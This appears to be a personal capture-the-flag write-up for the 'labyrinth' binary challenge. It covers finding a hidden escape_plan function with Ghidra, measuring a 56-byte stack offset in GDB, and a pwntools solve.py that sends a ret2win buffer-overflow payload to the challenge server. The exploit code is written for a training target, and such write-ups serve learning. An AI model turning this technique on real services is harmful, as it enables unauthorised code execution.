Description: 
You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.


```
cat labyrinth
```
  - found string that shows choosing door 069 leads to next stage
```
file labyrinth
```
  - 64 bit ELF executable program

Connected to labyrinth challenge
	
  - Selected door 069
	
  - Next prompt: "You are heading to open the door but you suddenly see something on the wall: 'Fly like a bird and be free!' Would you like to change the door you chose?" > tried inputting each of the 100 doors > returns "Failed to escape!"

Installed Ghidra (reverse engineering tool to get source code of program)
	
  - found main and escape_plan functions in source code
	
  - main function does not call escape_plan at any point
	
  - 2nd prompt in program uses fgets() function with a 0x44 buffer size

Found vulnerability to buffer overflow attack 

REF: https://www.youtube.com/watch?v=eg0gULifHFI

 
 - explains how to perform a buffer overflow attack on x64 program
	
  - setup GEF GDB tools in Linux

```
gdb ./labyrinth
```
- created a pattern string and found the offset for escape_plan() function at 56 characters

- p escape_plan (memory address: 0x401255)

```
python -c 'print("A"*56 + "\x55\x12\x40\x00\x00\x00\x00\x00")'
```

started up gdb again for labyrinth

- tried manually entering buffer overflow input into program

- RIP memory address changed to 0x7fff000a4055

RIP memory address not pointing to the exact memory address of escape_plan function

REF: https://mregraoncyber.com/rop-emporium-writeup-ret2win/

Step 7 explains extra step that is needed to perform buffer overflow attack on x64 programs
	
 - need to add RET address to buffer with padding and escape_plan address
  
solve.py:

```
from pwn import *

r = remote("104.248.169.177", 31999)
escape = 0x401255
ret = 0x401602

payload = b'A'*56 + p64(ret) + p64(escape)
print(payload)

r.sendlineafter(">>", b'69')
r.sendlineafter(">>", payload)

print(r.recvall())
```

RETRIEVED FLAG 
